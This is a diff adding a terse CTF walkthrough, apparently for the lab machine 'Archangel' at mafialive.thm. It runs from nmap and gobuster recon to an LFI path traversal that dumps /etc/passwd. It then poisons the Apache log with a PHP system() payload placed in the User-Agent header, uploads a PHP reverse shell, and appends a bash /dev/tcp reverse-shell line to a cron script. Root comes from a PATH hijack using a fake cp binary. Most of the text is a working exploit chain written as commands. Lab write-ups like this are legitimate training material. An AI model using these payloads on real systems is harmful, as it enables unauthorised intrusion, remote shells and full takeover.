@@ -1,0 +1,112 @@
+ip address:10.10.30.156
+
+Nmap:
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
+|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Wavefire
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Gobuster:
+
+on http://10.10.30.156/:
+/images (Status: 301)
+/pages (Status: 301)
+/flags (Status: 301)
+/layout (Status: 301)
+
+found another domain: mafialive.thm
+found robots.txt file:
+Disallow: /test.php
+
+Found LFI: http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../etc/passwd
+
+ root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
+
+<page>.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
+
+use inspector:
+
+add the following to user-agent header:User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0
+
+add the following to the end of the url: ..../apache2/access.log&cmd=ls
+
+now we can read the files form the directory
+
+NOW lets try to upload a php reverse shell:
+
+open a php reverse shell on the atacking machine and edit the ip address and port
+
+start a simple http server: python3 -m http.server 80
+
+go back to the inspector and add the user-agent modification and the following part to the end of the url: http://<hostname>/php_rev.php
+
+open a netcat listener on the port specified in the php reverse shell
+
+navigate to the http://mafialive.thm/php-reverse-shell.php
+
+USER escalation:
+
+cat /etc/crontab
+
+modify the /opt/helloworld.sh in order to escalate to Archangel user:
+
+$nano /opt/helloworld.sh
+
+echo "bash -i >& /dev/tcp/<thm_ip>/1235 0>&1" >> /opt/helloworld.sh
+
+open a new netcat listener on port 1235: $nc -lvnp 1235
+
+navigate to /home/archangel/secret and check backup file
+
+$ file backup -ELF file meaning it can be run
+
+run backup file: ./backup
+
+We receive an error, saying there isn’t a file or directory. It is trying to use the cp command, which we can abuse!
+
+echo '/bin/bash -p' > cp
+chmod 777 cp
+export PATH=/home/archangel/secret:$PATH
+echo $PATH
+
+run again the backup file :$./backup to gain root access
+
+
